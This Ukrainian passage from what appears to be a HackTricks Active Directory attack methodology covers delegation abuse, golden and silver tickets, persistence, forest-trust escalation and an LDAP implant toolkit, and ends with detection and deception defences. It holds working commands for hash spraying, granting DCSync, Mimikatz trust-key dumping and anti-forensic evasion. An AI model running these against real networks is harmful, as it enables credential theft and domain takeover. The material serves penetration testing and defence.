У методі атаки **Pass The Ticket (PTT)** зловмисники **викрадають квиток автентифікації користувача**, а не його пароль або значення хешу. Потім цей викрадений квиток використовується для **імперсонації користувача**, отримуючи несанкціонований доступ до ресурсів і служб у мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Повторне використання облікових даних

Якщо у вас є **хеш** або **пароль** **локального адміністратора**, слід спробувати **локально увійти** на інші **ПК**, використовуючи його.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зверніть увагу, що це досить **noisy**, і **LAPS** може це **mitigate**.

### Зловживання MSSQL і Trusted Links

Якщо користувач має привілеї для **доступу до інстансів MSSQL**, він може використати їх для **виконання команд** на хості MSSQL (якщо він працює від імені SA), **викрасти** NetNTLM **hash** або навіть виконати **relay** **attack**.\
Якщо інстанс MSSQL є trusted через database link з іншим інстансом, користувач із привілеями над linked database може мати змогу **використати trust relationship для виконання запитів на іншому інстансі**. Такі trust relationships можна об'єднувати в ланцюжки, і зрештою вони можуть привести до неправильно налаштованої бази даних, де користувач зможе виконувати команди.\
**Links між базами даних працюють навіть через forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Зловживання IT asset/deployment platforms

Сторонні inventory та deployment suites часто відкривають потужні шляхи до credentials і code execution. Дивіться:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете будь-який Computer object з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і маєте domain privileges на комп'ютері, ви зможете dump'нути TGT з пам'яті кожного користувача, який виконує logon на комп'ютері.\
Отже, якщо **Domain Admin виконає logon на комп'ютері**, ви зможете dump'нути його TGT та impersonate його за допомогою [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation ви навіть можете **автоматично скомпрометувати Print Server** (сподіваємося, це буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувачу або комп'ютеру дозволено "Constrained Delegation", він зможе **impersonate будь-якого користувача для доступу до певних services на комп'ютері**.\
Отже, якщо ви **скомпрометуєте hash** цього користувача/комп'ютера, ви зможете **impersonate будь-якого користувача** (навіть domain admins) для доступу до певних services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Наявність привілею **WRITE** на Active Directory object віддаленого комп'ютера дає змогу отримати code execution з **підвищеними привілеями**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Зловживання Permissions/ACLs

Скомпрометований користувач може мати **цікаві привілеї над деякими domain objects**, які можуть дозволити вам здійснити lateral **рух**/**підвищити** привілеї.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Зловживання Printer Spooler service

Виявлення **Spool service, що прослуховує** в домені, може бути **використане** для **отримання нових credentials** і **підвищення привілеїв**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Зловживання third party sessions

Якщо **інші користувачі** **отримують доступ** до **скомпрометованої** машини, можна **зібрати credentials з пам'яті** і навіть **inject beacons у їхні processes**, щоб impersonate їх.\
Зазвичай користувачі отримують доступ до системи через RDP, тож тут описано, як виконати кілька атак на third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** надає систему для керування **паролем локального Administrator** на domain-joined комп'ютерах, забезпечуючи його **рандомізацію**, унікальність і часту **зміну**. Ці паролі зберігаються в Active Directory, а доступ до них контролюється через ACLs лише для авторизованих користувачів. За наявності достатніх permissions для доступу до цих паролів стає можливим pivoting до інших комп'ютерів.


{{#ref}}
laps.md
{{#endref}}

### Викрадення сертифікатів

**Збір certificates** зі скомпрометованої машини може бути способом підвищити привілеї всередині середовища:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Зловживання Certificate Templates

Якщо налаштовано **вразливі templates**, їх можна використати для підвищення привілеїв:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation з обліковим записом із високими привілеями

### Dumping Domain Credentials

Після отримання привілеїв **Domain Admin** або, ще краще, **Enterprise Admin** ви можете **dump'нути** **domain database**: _ntds.dit_.

[**Більше інформації про DCSync attack можна знайти тут**](dcsync.md).

[**Більше інформації про викрадення NTDS.dit можна знайти тут**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc як Persistence

Деякі з описаних вище технік можна використовувати для persistence.\
Наприклад, ви можете:

- Зробити користувачів вразливими до [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Зробити користувачів вразливими до [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Надати користувачу привілеї [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** створює **легітимний Ticket Granting Service (TGS) ticket** для певного service, використовуючи **NTLM hash** (наприклад, **hash облікового запису PC**). Цей метод застосовується для **доступу до service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** передбачає отримання attacker'ом доступу до **NTLM hash облікового запису krbtgt** у середовищі Active Directory (AD). Цей обліковий запис є особливим, оскільки використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, необхідних для автентифікації в мережі AD.

Отримавши цей hash, attacker може створювати **TGTs** для будь-якого обраного облікового запису (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це схоже на golden tickets, підроблені таким чином, що **обходять поширені механізми виявлення golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence облікових записів через Certificates**

**Наявність certificates облікового запису або можливість запитувати їх** є дуже хорошим способом зберегти persistence в обліковому записі користувача (навіть якщо він змінить пароль):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence домену через Certificates**

**Використання certificates також дає змогу зберегти persistence із високими привілеями всередині домену:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Група AdminSDHolder

Об'єкт **AdminSDHolder** в Active Directory забезпечує безпеку **привілейованих груп** (таких як Domain Admins і Enterprise Admins), застосовуючи стандартний **Access Control List (ACL)** до цих груп для запобігання несанкціонованим змінам. Однак цю функцію можна використати; якщо attacker змінить ACL AdminSDHolder, надавши повний доступ звичайному користувачу, цей користувач отримає значний контроль над усіма привілейованими групами. Отже, цей захисний механізм може дати зворотний ефект і дозволити небажаний доступ, якщо його не контролювати належним чином.

[**Більше інформації про групу AdminDSHolder тут.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credentials DSRM

Усередині кожного **Domain Controller (DC)** існує обліковий запис **local administrator**. Отримавши admin rights на такій машині, можна витягнути hash локального Administrator за допомогою **mimikatz**. Після цього потрібна модифікація registry, щоб **увімкнути використання цього пароля**, що дозволить віддалений доступ до облікового запису локального Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Ви можете **надати** користувачу деякі **спеціальні permissions** над певними domain objects, що дозволить користувачу **підвищити привілеї в майбутньому**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** використовуються для **зберігання** **permissions**, які **object** має **над** іншим **object**. Якщо ви можете лише **внести** **невелику зміну** до **security descriptor** object, ви можете отримати дуже цікаві привілеї над цим object без необхідності бути членом привілейованої групи.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Зловживайте auxiliary class `dynamicObject`, щоб створювати короткоживучі principals/GPOs/DNS records із `entryTTL`/`msDS-Entry-Time-To-Die`; вони самостійно видаляються без tombstones, стираючи LDAP evidence, водночас залишаючи orphan SIDs, зламані `gPLink` references або cached DNS responses (наприклад, забруднення ACE AdminSDHolder або шкідливі `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Змініть **LSASS** у пам'яті, щоб встановити **універсальний пароль**, який надає доступ до всіх domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Дізнайтеся, що таке SSP (Security Support Provider), тут.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити **власний SSP**, щоб **перехоплювати** у **clear text** **credentials**, які використовуються для доступу до машини.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Він реєструє **новий Domain Controller** в AD і використовує його для **push'у attributes** (SIDHistory, SPNs...) до визначених objects, **не залишаючи** жодних **logs** щодо **модифікацій**. Вам **потрібні DA** privileges і необхідно перебувати всередині **root domain**.\
Зверніть увагу, що якщо використати неправильні дані, з'являться дуже неприємні logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми обговорювали, як підвищити привілеї, якщо у вас є **достатні permissions для читання LAPS passwords**. Однак ці паролі також можна використовувати для **підтримання persistence**.\
Дивіться:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft розглядає **Forest** як межу безпеки. Це означає, що **компрометація одного домену потенційно може призвести до компрометації всього Forest**.<sup>[[1]](#references)</sup>

### Базова інформація

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це security mechanism, який дає змогу користувачу з одного **domain** отримувати доступ до resources в іншому **domain**. По суті, він створює зв'язок між authentication systems двох доменів, дозволяючи authentication verifications безперешкодно проходити між ними. Коли domains налаштовують trust, вони обмінюються та зберігають певні **keys** у своїх **Domain Controllers (DCs)**, які є критично важливими для цілісності trust.

У типовому сценарії, якщо користувач хоче отримати доступ до service у **trusted domain**, він спочатку має запитати спеціальний ticket, відомий як **inter-realm TGT**, у DC власного domain. Цей TGT зашифрований спільним **key**, про який домовилися обидва domains. Потім користувач передає цей TGT до **DC trusted domain**, щоб отримати service ticket (**TGS**). Після успішної перевірки inter-realm TGT DC trusted domain видає TGS, надаючи користувачу доступ до service.

**Кроки**:

1. **Client computer** у **Domain 1** починає процес, використовуючи свій **NTLM hash** для запиту **Ticket Granting Ticket (TGT)** у свого **Domain Controller (DC1)**.
2. DC1 видає новий TGT, якщо client успішно автентифіковано.
3. Потім client запитує **inter-realm TGT** у DC1, який потрібен для доступу до resources у **Domain 2**.
4. Inter-realm TGT зашифрований **trust key**, спільним для DC1 і DC2 у межах двостороннього domain trust.
5. Client передає inter-realm TGT до **Domain Controller (DC2) Domain 2**.
6. DC2 перевіряє inter-realm TGT за допомогою спільного trust key і, якщо він дійсний, видає **Ticket Granting Service (TGS)** для server у Domain 2, до якого client хоче отримати доступ.
7. Нарешті client передає цей TGS server'у, який зашифрований hash облікового запису server, щоб отримати доступ до service у Domain 2.

### Різні trusts

Важливо зазначити, що **trust може бути одностороннім або двостороннім**. У двосторонньому варіанті обидва domains довіряють один одному, а в **односторонньому** trust relation один із domains буде **trusted**, а інший — **trusting** domain. В останньому випадку **ви зможете отримувати доступ до resources всередині trusting domain лише з trusted domain**.

Якщо Domain A довіряє Domain B, A є trusting domain, а B — trusted. Крім того, у **Domain A** це буде **Outbound trust**, а в **Domain B** — **Inbound trust**.

**Різні trusting relationships**

- **Parent-Child Trusts**: Це поширена конфігурація в межах одного forest, де child domain автоматично має двосторонній transitive trust із parent domain. По суті, це означає, що authentication requests можуть безперешкодно проходити між parent і child.
- **Cross-link Trusts**: Також відомі як "shortcut trusts"; вони створюються між child domains для прискорення referral processes. У складних forests authentication referrals зазвичай мають пройти вгору до forest root, а потім вниз до target domain. Створення cross-links скорочує цей шлях, що особливо корисно в географічно розподілених середовищах.
- **External Trusts**: Вони налаштовуються між різними, не пов'язаними domains і за своєю природою є non-transitive. Відповідно до [документації Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts корисні для доступу до resources у domain за межами поточного forest, який не підключений через forest trust. Безпека посилюється завдяки SID filtering у external trusts.
- **Tree-root Trusts**: Ці trusts автоматично встановлюються між forest root domain і новим tree root. Хоча вони трапляються нечасто, tree-root trusts важливі для додавання нових domain trees до forest, дозволяючи їм зберігати унікальне domain name і забезпечуючи двосторонню transitivity. Більше інформації можна знайти в [посібнику Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Цей тип trust є двостороннім transitive trust між двома forest root domains і також застосовує SID filtering для посилення security measures.
- **MIT Trusts**: Ці trusts встановлюються з не-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts є дещо спеціалізованими й призначені для середовищ, яким потрібна інтеграція із Kerberos-based systems поза екосистемою Windows.

#### Інші відмінності в **trusting relationships**

- Trust relationship також може бути **transitive** (A trust B, B trust C, тоді A trust C) або **non-transitive**.
- Trust relationship може бути налаштований як **bidirectional trust** (обидва довіряють один одному) або як **one-way trust** (лише один із них довіряє іншому).

### Attack Path

1. **Перелічити** trusting relationships
2. Перевірити, чи має будь-який **security principal** (user/group/computer) **доступ** до resources **іншого domain**, можливо через ACE entries або членство в groups іншого domain. Шукайте **relationships між domains** (імовірно, саме для цього було створено trust).
1. У цьому випадку kerberoast також може бути ще одним варіантом.
3. **Скомпрометувати** **accounts**, які можуть виконувати **pivot** між domains.

Attackers можуть отримати доступ до resources в іншому domain через три основні механізми:

- **Local Group Membership**: Principals можуть бути додані до local groups на machines, наприклад до групи “Administrators” на server, що надає їм значний контроль над цією machine.
- **Foreign Domain Group Membership**: Principals також можуть бути членами groups у foreign domain. Однак ефективність цього методу залежить від природи trust і scope group.
- **Access Control Lists (ACLs)**: Principals можуть бути вказані в **ACL**, зокрема як entities в **ACEs** усередині **DACL**, що надає їм доступ до певних resources. Для тих, хто хоче глибше розібратися в механіці ACLs, DACLs і ACEs, whitepaper під назвою “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” є безцінним ресурсом.<sup>[[17]](#references)</sup>

### Пошук зовнішніх users/groups із permissions

Ви можете перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти foreign security principals у domain. Це будуть user/group із **зовнішнього domain/forest**.

Ви можете перевірити це в **Bloodhound** або за допомогою powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Ескалація привілеїв із дочірнього лісу до батьківського
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи перерахування довірчих відносин між доменами:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Існує **2 довірені ключі**: один для _Child --> Parent_, а інший для _Parent_ --> _Child_.\
> Отримати ключ, який використовується поточним доменом, можна за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Підвищте привілеї до Enterprise admin у child/parent domain, зловживаючи trust через SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Експлуатація доступного для запису Configuration NC

Розуміння того, як можна експлуатувати Configuration Naming Context (NC), має вирішальне значення. Configuration NC слугує центральним сховищем даних конфігурації в усьому forest у середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у forest, а доступні для запису DC підтримують доступну для запису копію Configuration NC. Для цього необхідно мати **SYSTEM privileges на DC**, бажано на child DC.

**Прив'язка GPO до root DC site**

Контейнер Sites у Configuration NC містить інформацію про сайти всіх комп'ютерів, приєднаних до домену, у forest AD. Маючи SYSTEM privileges на будь-якому DC, attackers можуть прив'язати GPO до root DC sites. Ця дія потенційно компрометує root domain шляхом маніпулювання політиками, застосованими до цих сайтів.

Для отримання детальної інформації можна ознайомитися з дослідженням [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Компрометація будь-якого gMSA у forest**

Один із векторів атаки полягає в націлюванні на privileged gMSA у домені. KDS Root key, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи SYSTEM privileges на будь-якому DC, можна отримати доступ до KDS Root key і обчислити паролі для будь-якого gMSA у forest.

Детальний аналіз і покрокові інструкції наведено тут:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Додаткова атака на делегований MSA (BadSuccessor – зловживання migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Додаткове зовнішнє дослідження: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Атака зі зміною Schema**

Цей метод вимагає терпіння — потрібно чекати на створення нових privileged AD objects. Маючи SYSTEM privileges, attacker може змінити AD Schema, щоб надати будь-якому користувачу повний контроль над усіма класами. Це може призвести до несанкціонованого доступу та контролю над новоствореними AD objects.

Додаткову інформацію наведено в [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Від DA до EA за допомогою ADCS ESC5**

Вразливість ADCS ESC5 націлена на контроль над об'єктами Public Key Infrastructure (PKI) для створення certificate template, який забезпечує автентифікацію як будь-який користувач у forest. Оскільки PKI objects зберігаються в Configuration NC, компрометація доступного для запису child DC дає змогу виконувати ESC5 attacks.

Детальніше про це можна прочитати у [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Якщо ADCS відсутній, attacker може налаштувати необхідні компоненти, як описано в [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Зовнішній forest domain — односторонній (вхідний) або двонаправлений
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **вашому домену довіряє** зовнішній домен, надаючи вам **невизначені дозволи** щодо нього. Вам потрібно буде визначити, **які суб'єкти безпеки вашого домену мають який доступ до зовнішнього домену**, а потім спробувати це експлуатувати:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Зовнішній домен лісу — односторонній (вихідний)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **ваш домен** **довіряє** певні **привілеї** principal з **інших доменів**.

Однак, коли **домену довіряє** довіряючий домен, довірений домен **створює користувача** з **передбачуваним іменем**, який використовує як **пароль пароль довіреного домену**. Це означає, що можна **отримати доступ до користувача з довіряючого домену, щоб потрапити до довіреного**, виконати його перерахування та спробувати підвищити привілеї:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ще один спосіб скомпрометувати довірений домен — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений у **протилежному напрямку** від напрямку довіри домену (що трапляється не дуже часто).

Ще один спосіб скомпрометувати довірений домен — чекати на машині, до якої **може отримати доступ користувач із довіреного домену**, щоб він увійшов через **RDP**. Потім attacker може впровадити код у процес RDP-сесії та **отримати доступ до вихідного домену жертви** звідти.\
Крім того, якщо **жертва підключила свій жорсткий диск**, attacker із процесу **RDP-сесії** може зберегти **backdoors** у **startup folder жорсткого диска**. Ця техніка називається **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Пом'якшення наслідків зловживання довірою домену

### **SID Filtering:**

- Ризик атак із використанням атрибута SID history через довіру між forest зменшується завдяки SID Filtering, який за замовчуванням активовано для всіх довірчих відносин між forest. Це ґрунтується на припущенні, що довірчі відносини всередині forest є безпечними, оскільки відповідно до позиції Microsoft межею безпеки вважається forest, а не домен.
- Однак є нюанс: SID filtering може порушити роботу застосунків і доступ користувачів, через що його іноді вимикають.

### **Selective Authentication:**

- Для довірчих відносин між forest використання Selective Authentication гарантує, що користувачі з двох forest не проходитимуть автентифікацію автоматично. Натомість користувачам потрібні явні дозволи для доступу до доменів і серверів у довіряючому домені або forest.
- Важливо зазначити, що ці заходи не захищають від використання вразливостей у writable Configuration Naming Context (NC) або атак на обліковий запис довіри.

[**Більше інформації про довіру між доменами в ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Зловживання AD на основі LDAP з on-host implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) повторно реалізує LDAP primitives у стилі bloodyAD як x64 Beacon Object Files, що повністю працюють усередині on-host implant (наприклад, Adaptix C2). Оператори компілюють pack за допомогою `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, завантажують `ldap.axs`, а потім викликають `ldap <subcommand>` із beacon. Увесь трафік проходить через поточний контекст безпеки входу через LDAP (389) із signing/sealing або через LDAPS (636) з автоматичною довірою до сертифіката, тому socks proxies або disk artifacts не потрібні.<sup>[[4]](#references)</sup>

### Перерахування LDAP на стороні implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` і `get-groupmembers` перетворюють короткі імена або шляхи OU на повні DN та виводять відповідні об'єкти.
- `get-object`, `get-attribute` і `get-domaininfo` отримують довільні атрибути (зокрема security descriptors), а також метадані forest/domain із `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` і `get-rbcd` безпосередньо з LDAP надають інформацію про roasting candidates, налаштування delegation і наявні дескриптори [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` і `get-writable --detailed` аналізують DACL, щоб перелічити trustees, права (GenericAll/WriteDACL/WriteOwner/attribute writes) та успадкування, одразу визначаючи цілі для privilege escalation через ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-примітиви запису для ескалації та persistence

- BOF-и створення об’єктів (`add-user`, `add-computer`, `add-group`, `add-ou`) дають оператору змогу розгортати нові principals або облікові записи машин там, де існують права на OU. `add-groupmember`, `set-password`, `add-attribute` і `set-attribute` безпосередньо захоплюють цілі після виявлення прав write-property.
- Команди, орієнтовані на ACL, як-от `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` і `add-dcsync`, перетворюють WriteDACL/WriteOwner для будь-якого об’єкта AD на скидання паролів, контроль членства в групах або привілеї реплікації DCSync без залишення артефактів PowerShell/ADSI. Відповідні `remove-*` команди очищають ін’єктовані ACE.

### Делегування, roasting і зловживання Kerberos

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача придатним для Kerberoast; `add-asreproastable` (перемикач UAC) позначає його для AS-REP roasting без зміни пароля.
- Макроси делегування (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) переписують `msDS-AllowedToDelegateTo`, прапорці UAC або `msDS-AllowedToActOnBehalfOfOtherIdentity` з beacon, уможливлюючи шляхи атак із constrained/unconstrained/RBCD та усуваючи потребу у віддаленому PowerShell або RSAT.

### Ін’єкція sidHistory, переміщення OU і формування attack surface

- `add-sidhistory` ін’єктує привілейовані SID в історію SID контрольованого principal (див. [SID-History Injection](sid-history-injection.md)), забезпечуючи приховане успадкування доступу повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп’ютерів або користувачів, даючи зловмиснику змогу перемістити активи до OU, де вже існують делеговані права, перш ніж зловживати `set-password`, `add-groupmember` або `add-spn`.
- Команди видалення з вузькою областю дії (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дають змогу швидко відкотити зміни після отримання оператором облікових даних або persistence, мінімізуючи телеметрію.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Деякі загальні засоби захисту

[**Дізнайтеся більше про захист облікових даних тут.**](../stealing-credentials/credentials-protections.md)

### **Захисні заходи для захисту облікових даних**

- **Обмеження для Domain Admins**: рекомендується дозволяти Domain Admins входити лише до Domain Controllers, не використовуючи їх на інших хостах.
- **Привілеї service accounts**: служби не повинні працювати з привілеями Domain Admin (DA) для підтримання безпеки.
- **Тимчасове обмеження привілеїв**: для завдань, що потребують привілеїв DA, їхню тривалість слід обмежувати. Цього можна досягти за допомогою: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Зменшення ризику LDAP relay**: перевіряйте Event ID 2889/3074/3075, а потім увімкніть LDAP signing і прив’язування каналу LDAPS на DC/клієнтах, щоб блокувати спроби LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Виявлення активності Impacket на рівні протоколу

Якщо ви хочете виявляти поширені AD tradecraft, **не покладайтеся лише на артефакти, контрольовані оператором**, такі як перейменовані бінарні файли, назви служб, тимчасові batch-файли або шляхи виводу. Створіть baseline того, як легітимні клієнти Windows формують трафік [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC і WMI, а потім шукайте **особливості реалізації**, які зберігаються навіть після редагування оператором `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` або `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Кандидати з високою достовірністю як самостійні ознаки** (після перевірки за власним baseline):
- Автентифікований DCE/RPC із використанням `auth_context_id = 79231 + ctx_id`
- Заповнення padding автентифікації DCE/RPC значенням `0xff`
- LDAP Kerberos binds, які розміщують необроблений Kerberos `AP-REQ` безпосередньо в SPNEGO `mechToken`
- Запити negotiate SMB2/3 зі значеннями `ClientGuid`, що виглядають як ASCII
- WMI `IWbemLevel1Login::NTLMLogin` із нестандартним namespace `//./root/cimv2`
- Жорстко задані значення nonce Kerberos
- **Краще використовувати як ознаки для кореляції/оцінювання**:
- Розріджені або дубльовані списки типів Kerberos etype, нетипові/відсутні `PA-DATA` або порядок etype у TGS-REQ, що відрізняється від native Windows
- Повідомлення NTLM Type 1 без інформації про версію або повідомлення Type 3 із null-іменами хостів
- Необроблений NTLMSSP у DCE/RPC замість SPNEGO, відсутні verification trailers DCE/RPC або невідповідності OID SPNEGO/Kerberos
- Кілька таких ознак від одного хоста/користувача/сеансу/часового вікна значно сильніші за будь-яке окреме слабке поле
- **Використовуйте для enrichment, а не як самостійні alerts**:
- Типові імена файлів, шляхи виводу, випадкові назви служб, назви тимчасових batch-файлів, типові імена облікових записів комп’ютерів і специфічні для інструментів рядки HTTP/WebDAV/RDP/MSSQL
- Операторам легко їх змінити, тому їх найкраще використовувати для пояснення, чому cross-protocol cluster є підозрілим
- **Операційні примітки**:
- Для деяких із цих сигналів потрібні розшифрований трафік, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW або видимість на стороні служби
- Перед перетворенням на alerts перевірте їх за клієнтами Samba/Linux, appliance-пристроями та legacy software
- У міру зростання впевненості в baseline переводьте detections від enrichment -> hunting -> alerting

### **Реалізація deception techniques**

- Реалізація deception передбачає встановлення пасток, наприклад decoy-користувачів або комп’ютерів, із такими властивостями, як паролі, термін дії яких не спливає, або позначення Trusted for Delegation. Детальний підхід передбачає створення користувачів із певними правами або додавання їх до груп із високими привілеями.<sup>[[2]](#references)</sup>
- Практичний приклад передбачає використання таких інструментів: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Більше інформації про розгортання deception techniques наведено на [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Виявлення deception**

- **Для об’єктів користувачів**: підозрілими індикаторами є нетиповий ObjectSID, нечасті входи, дати створення та низька кількість невдалих введень пароля.
- **Загальні індикатори**: порівняння атрибутів потенційних decoy-об’єктів із атрибутами справжніх об’єктів може виявити невідповідності. Такі інструменти, як [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster), можуть допомогти виявити подібні deception.

### **Обхід detection systems**

- **Обхід Microsoft ATA Detection**:
- **Перерахування користувачів**: уникайте перерахування сеансів на Domain Controllers, щоб запобігти виявленню ATA.
